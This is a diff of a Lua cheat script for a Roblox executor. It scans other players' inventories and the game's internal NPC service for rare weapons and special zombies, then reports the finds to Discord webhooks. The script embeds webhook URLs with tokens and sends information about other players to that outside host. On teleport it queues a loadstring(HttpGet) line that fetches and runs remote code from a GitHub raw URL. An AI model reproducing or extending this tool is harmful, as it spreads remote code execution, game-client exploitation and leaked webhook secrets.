@@ -1,17 +1,27 @@
---111--
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
+local ReplicatedFirst = game:GetService("ReplicatedFirst")
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1514748526259863573/penNBANl1GuMF8Gn3Gb4A533oMZa7AK81y07zsWRwqPaXRxGTtCLLiSWjV3ZyhziTy8w"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1514220538904580147/Plw4co_JKKE28LHt5UcQwsAkAOlzNB0Vq2biXgm1ycp7w1dJE3yoczk4lvTygfrXXR8Y"
 local HUB_PLACE_ID = 15327728308
 
-local ITENS_ALVO = {"barret50", "renellim4", "m79", "backpacktier4"}
+local CARGO_GUNS = "1514232556852215918"
+local CARGO_SPECIAL_ZOMBIE = "1514232594429116426"
+local CARGO_TIER4 = "1514030917474058240"
 
+local ITENS_ALVO = {"barret50", "renellim4", "m79", "backpacktier4"}
+local ZOMBIE_TARGETS = {
+    ["AltynHelmet"]  = "Chinese zombie detected (AltynHelmet)",
+    ["BlackBeret"]   = "Tactical zombie detected (BlackBeret)",
+    ["GreenBeret"]   = "Tactical zombie detected (GreenBeret)"
+}
 
 if not game:IsLoaded() then
     game.Loaded:Wait()
 end
+
+task.wait(5)
 
 local function sendToDiscord(msg)
     local req = syn and syn.request or http_request or request
@@ -27,15 +37,31 @@ local function sendToDiscord(msg)
     end
 end
 
-
-task.wait(1)
+local function recursiveFind(data, searchKey, visited, depth)
+    visited = visited or {}
+    depth = depth or 0
+    if depth > 10 then return false end
+    if type(data) == "string" then
+        return data:find(searchKey) ~= nil
+    elseif type(data) == "table" then
+        if visited[data] then return false end
+        visited[data] = true
+        for _, value in pairs(data) do
+            if recursiveFind(value, searchKey, visited, depth + 1) then
+                return true
+            end
+        end
+    end
+    return false
+end
 
 local found = {}
+local zombieCount = 0
 
 for _, player in ipairs(Players:GetPlayers()) do
     if player == Players.LocalPlayer then continue end
-
-    local inv = player:WaitForChild("GunInventory", 1)
+    
+    local inv = player:WaitForChild("GunInventory", 3)
     if inv then
         for _, obj in ipairs(inv:GetChildren()) do
             if obj:IsA("ObjectValue") and obj.Value then
@@ -44,7 +70,7 @@ for _, player in ipairs(Players:GetPlayers()) do
                     if nome and nome:lower():find(alvo:lower()) then
                         local mag = obj:FindFirstChild("BulletsInMagazine") and obj.BulletsInMagazine.Value or 0
                         table.insert(found, string.format("%s | %s | %d balas", player.Name, nome, mag))
-                        sendToDiscord("Found: " .. player.Name .. " | " .. nome)
+                        sendToDiscord("<@&" .. CARGO_GUNS .. "> Found: " .. player.Name .. " | " .. nome)
                     end
                 end
             end
@@ -54,18 +80,63 @@ for _, player in ipairs(Players:GetPlayers()) do
     local bp = player:GetAttribute("EquipmentBackpack")
     if bp and tostring(bp):lower():find("backpacktier4") then
         table.insert(found, string.format("%s | BackpackTier4 | N/A", player.Name))
-        sendToDiscord("Tier4: " .. player.Name)
+        sendToDiscord("<@&" .. CARGO_TIER4 .. "> Tier4: " .. player.Name)
     end
 end
 
+local success, emberLibrary = pcall(function()
+    return ReplicatedFirst:WaitForChild("EmberClientLibrary", 10)
+end)
+
+if success and emberLibrary then
+    local success2, gameClient = pcall(function()
+        return emberLibrary:WaitForChild("GameClient", 10)
+    end)
+    
+    if success2 and gameClient then
+        local success3, services = pcall(function()
+            return gameClient:WaitForChild("Services", 10)
+        end)
+        
+        if success3 and services then
+            local success4, npcServiceFile = pcall(function()
+                return services:WaitForChild("NPCSimulatorService.service", 10)
+            end)
+            
+            if success4 and npcServiceFile then
+                local success5, NPCSimulatorService = pcall(function()
+                    return require(npcServiceFile)
+                end)
+                
+                if success5 and NPCSimulatorService and NPCSimulatorService.NPCs then
+                    for _, npcData in pairs(NPCSimulatorService.NPCs) do
+                        for key, message in pairs(ZOMBIE_TARGETS) do
+                            if recursiveFind(npcData, key) then
+                                zombieCount = zombieCount + 1
+                                table.insert(found, "Zombie | " .. message)
+                                sendToDiscord("<@&" .. CARGO_SPECIAL_ZOMBIE .. "> Zombie Found: " .. message)
+                                break
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+
+if zombieCount > 0 then
+    sendToDiscord("<@&" .. CARGO_SPECIAL_ZOMBIE .. "> Special Zombie: " .. zombieCount)
+end
+
 if #found > 0 then
-    sendToDiscord("Found: " .. #found)
+    sendToDiscord("Found Total: " .. #found)
 else
     sendToDiscord("Nothing")
 end
 
+task.wait(3)
 
-task.wait(1)
 local qt = queue_on_teleport or queueteleport or (syn and syn.queue_on_teleport)
 if qt then
     qt([[loadstring(game:HttpGet("https://raw.githubusercontent.com/cajiwghdtyasdnhatfy/Acaswartqaawr/refs/heads/main/Hub"))()]])
